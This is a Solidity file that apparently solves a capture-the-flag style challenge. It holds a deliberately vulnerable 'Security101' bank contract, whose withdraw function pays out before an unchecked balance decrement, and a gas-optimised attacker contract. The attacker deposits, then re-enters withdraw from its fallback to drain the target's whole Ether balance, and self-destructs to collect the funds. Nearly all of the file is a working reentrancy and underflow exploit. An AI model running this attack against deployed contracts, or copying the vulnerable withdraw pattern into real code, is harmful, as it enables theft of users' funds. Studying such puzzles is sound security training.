// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// 489630
contract OptimizedAttackerSecurity101 {
    constructor(address t) payable {
      (new Attacker()).attack8290169{value: msg.value}();
      selfdestruct(payable(msg.sender));
    }
}


contract Attacker {
    
    constructor() payable {
    }

    function attack8290169() external payable {
        unchecked {
            Security101(0x5FbDB2315678afecb367f032d93F642f64180aa3).deposit{value: msg.value}();
            Security101(0x5FbDB2315678afecb367f032d93F642f64180aa3).withdraw{gas:340900}(msg.value);
        }
    }

    fallback() external payable {
      
        unchecked {
            uint256 g = gasleft();
            
            if (g > 72000) {
                Security101(msg.sender).deposit{value: msg.value}();
                Security101(msg.sender).withdraw(msg.value + msg.value);
            } else if (g > 50000) {
              Security101(msg.sender).withdraw(msg.sender.balance);
            }
        }
    }
}